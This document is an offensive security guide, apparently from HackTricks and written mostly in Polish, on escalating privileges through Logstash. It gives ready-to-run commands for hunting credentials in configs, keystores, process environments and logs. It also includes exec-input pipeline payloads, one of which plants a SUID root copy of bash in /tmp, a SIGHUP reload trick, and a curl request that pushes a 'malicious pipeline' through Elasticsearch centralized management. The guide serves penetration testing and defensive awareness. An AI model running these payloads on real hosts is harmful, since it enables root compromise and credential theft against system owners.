# Logstash Privilege Escalation

{{#include ../../banners/hacktricks-training.md}}

## Logstash

Logstash służy do **gromadzenia, przekształcania i wysyłania logów** za pomocą systemu znanego jako **pipelines**. Te pipelines składają się z etapów **input**, **filter** i **output**. Pojawia się ciekawy aspekt, gdy Logstash działa na skompromitowanej maszynie.

### Konfiguracja pipeline'ów

Pipelines są konfigurowane w pliku **/etc/logstash/pipelines.yml**, który zawiera listę lokalizacji konfiguracji pipeline'ów:
```yaml
# Define your pipelines here. Multiple pipelines can be defined.
# For details on multiple pipelines, refer to the documentation:
# https://www.elastic.co/guide/en/logstash/current/multiple-pipelines.html

- pipeline.id: main
path.config: "/etc/logstash/conf.d/*.conf"
- pipeline.id: example
path.config: "/usr/share/logstash/pipeline/1*.conf"
pipeline.workers: 6
```
Ten plik ujawnia, gdzie znajdują się pliki **.conf**, zawierające konfiguracje pipeline.

When employing an **Elasticsearch output module**, it's common for **pipelines** to include **Elasticsearch credentials**, which often possess extensive privileges due to Logstash's need to write data to Elasticsearch. Wildcards in configuration paths allow Logstash to execute all matching pipelines in the designated directory.

If Logstash is started with `-f <directory>` instead of `pipelines.yml`, **all files inside that directory are concatenated in lexicographical order and parsed as a single config**. This creates 2 offensive implications:

- Dodany plik, taki jak `000-input.conf` lub `zzz-output.conf`, może zmienić sposób, w jaki finalny pipeline zostanie złożony
- Nieprawidłowo sformatowany plik może uniemożliwić załadowanie całego pipeline, więc dokładnie sprawdź poprawność payloadów zanim zaufasz auto-reload

### Szybka enumeracja na skompromitowanym hoście

Na maszynie z zainstalowanym Logstash szybko sprawdź:
```bash
ps aux | grep -i logstash
systemctl cat logstash 2>/dev/null
cat /etc/logstash/pipelines.yml 2>/dev/null
cat /etc/logstash/logstash.yml 2>/dev/null
find /etc/logstash /usr/share/logstash -maxdepth 3 -type f \( -name '*.conf' -o -name 'logstash.yml' -o -name 'pipelines.yml' \) -ls
rg -n --hidden -S 'password|passwd|api[_-]?key|cloud_auth|ssl_keystore_password|truststore_password|user\s*=>|hosts\s*=>' /etc/logstash /usr/share/logstash 2>/dev/null
```
Sprawdź również, czy lokalne API monitoringu jest osiągalne. Domyślnie nasłuchuje na **127.0.0.1:9600**, co zazwyczaj wystarcza po uzyskaniu dostępu do hosta:
```bash
curl -s http://127.0.0.1:9600/?pretty
curl -s http://127.0.0.1:9600/_node/pipelines?pretty
curl -s http://127.0.0.1:9600/_node/stats/pipelines?pretty
```
Zwykle otrzymujesz pipeline IDs, runtime details oraz potwierdzenie, że zmodyfikowany pipeline został załadowany.

Poświadczenia odzyskane z Logstash często odblokowują **Elasticsearch**, więc sprawdź [tę inną stronę o Elasticsearch](../../network-services-pentesting/9200-pentesting-elasticsearch.md).

### Eskalacja uprawnień przez zapisywalne pipelines

Aby spróbować eskalacji uprawnień, najpierw zidentyfikuj użytkownika, pod którym działa usługa Logstash, zwykle użytkownika **logstash**. Upewnij się, że spełniasz **jedno** z następujących kryteriów:

- Posiadać **uprawnienie do zapisu** do pliku pipeline **.conf** **lub**
- Plik **/etc/logstash/pipelines.yml** używa wildcarda i masz możliwość zapisu w docelowym folderze

Dodatkowo, **jedno** z poniższych warunków musi być spełnione:

- Możliwość restartu usługi Logstash **lub**
- Plik **/etc/logstash/logstash.yml** ma ustawione **config.reload.automatic: true**

Jeżeli w konfiguracji występuje wildcard, utworzenie pliku pasującego do tego wzorca pozwala na wykonanie poleceń. Na przykład:
```bash
input {
exec {
command => "whoami"
interval => 120
}
}

output {
file {
path => "/tmp/output.log"
codec => rubydebug
}
}
```
Tutaj **interval** określa częstotliwość wykonywania w sekundach. W podanym przykładzie polecenie **whoami** uruchamia się co 120 sekund, a jego wyjście jest kierowane do **/tmp/output.log**.

Z ustawionym **config.reload.automatic: true** w **/etc/logstash/logstash.yml**, Logstash automatycznie wykryje i zastosuje nowe lub zmodyfikowane konfiguracje pipeline bez konieczności restartu. Jeśli nie ma wildcard, wciąż można wprowadzać modyfikacje do istniejących konfiguracji, jednak zaleca się ostrożność, aby unikać zakłóceń.

### Bardziej niezawodne Pipeline Payloads

The `exec` input plugin nadal działa w aktualnych wydaniach i wymaga albo `interval`, albo `schedule`. Wykonuje się przez **forking** the Logstash JVM, więc jeśli pamięć jest ograniczona, twój payload może zakończyć się błędem `ENOMEM` zamiast działać bezgłośnie.

Bardziej praktyczny privilege-escalation payload to zwykle taki, który pozostawia trwały artefakt:
```bash
input {
exec {
command => "cp /bin/bash /tmp/logroot && chown root:root /tmp/logroot && chmod 4755 /tmp/logroot"
interval => 300
}
}
output {
null {}
}
```
Jeśli nie masz uprawnień do restartu, ale możesz wysłać sygnał do procesu, Logstash obsługuje także przeładowanie wywołane **SIGHUP** w systemach typu Unix:
```bash
kill -SIGHUP $(pgrep -f logstash)
```
Pamiętaj, że nie każdy plugin obsługuje automatyczne przeładowanie. Na przykład input **stdin** uniemożliwia automatyczne przeładowanie, więc nie zakładaj, że `config.reload.automatic` zawsze załapie Twoje zmiany.

### Wykradanie sekretów z Logstash

Zanim skupisz się wyłącznie na wykonaniu kodu, zbierz dane, do których Logstash już ma dostęp:

- Poświadczenia w postaci jawnego tekstu są często zakodowane bezpośrednio w outputach `elasticsearch {}`, `http_poller`, JDBC inputs lub w ustawieniach związanych z chmurą
- Ustawienia zabezpieczeń mogą znajdować się w **`/etc/logstash/logstash.keystore`** lub innym katalogu `path.settings`
- Hasło do keystore jest często podawane przez **`LOGSTASH_KEYSTORE_PASS`**, a instalacje z pakietów zwykle odczytują je z **`/etc/sysconfig/logstash`**
- Rozwijanie zmiennych środowiskowych z użyciem `${VAR}` odbywa się podczas uruchamiania Logstash, więc warto sprawdzić środowisko usługi

Przydatne sprawdzenia:
```bash
ls -l /etc/logstash /etc/logstash/logstash.keystore 2>/dev/null
strings /etc/logstash/conf.d/*.conf 2>/dev/null | head
tr '\0' '\n' < /proc/$(pgrep -o -f logstash)/environ 2>/dev/null | sort
cat /etc/sysconfig/logstash 2>/dev/null
journalctl -u logstash --no-pager 2>/dev/null | tail -n 200
ls -lah /var/log/logstash 2>/dev/null
```
To również warto sprawdzić, ponieważ **CVE-2023-46672** wykazał, że Logstash mógł rejestrować poufne informacje w logach w określonych okolicznościach. Na hoście po eksploatacji stare logi Logstash i `journald` mogą zatem ujawnić poświadczenia, nawet jeśli bieżąca konfiguracja odwołuje się do keystore zamiast przechowywać sekrety bezpośrednio.

### Nadużycie scentralizowanego zarządzania pipeline'ami

W niektórych środowiskach host w ogóle nie polega na lokalnych plikach `.conf`. Jeśli skonfigurowano **`xpack.management.enabled: true`**, Logstash może pobierać scentralizowane pipeline'y z Elasticsearch/Kibana, a po włączeniu tego trybu lokalne konfiguracje pipeline'ów przestają być źródłem prawdy.

To oznacza inną ścieżkę ataku:

1. Odzyskaj poświadczenia Elastic z lokalnych ustawień Logstash, keystore lub logów
2. Zweryfikuj, czy konto ma uprawnienie klastra **`manage_logstash_pipelines`**
3. Utwórz lub zastąp scentralizowany pipeline, aby host Logstash wykonał Twój payload przy następnym odpytywaniu

The Elasticsearch API used for this feature is:
```bash
curl -X PUT http://ELASTIC:9200/_logstash/pipeline/pwned \
-H 'Content-Type: application/json' \
-u user:password \
-d '{
"description": "malicious pipeline",
"pipeline": "input { exec { command => \"id > /tmp/.ls-rce\" interval => 120 } } output { null {} }",
"pipeline_metadata": {"type": "logstash_pipeline", "version": "1"},
"pipeline_settings": {"pipeline.workers": 1, "pipeline.batch.size": 1}
}'
```
Jest to szczególnie przydatne, gdy pliki lokalne są tylko do odczytu, ale Logstash jest już skonfigurowany do zdalnego pobierania pipelines.

## Źródła

- [Elastic Docs: Reloading the Config File](https://www.elastic.co/guide/en/logstash/8.19/reloading-config.html)
- [Elastic Docs: Configure Centralized Pipeline Management](https://www.elastic.co/guide/en/logstash/8.19/configuring-centralized-pipelines.html)

{{#include ../../banners/hacktricks-training.md}}
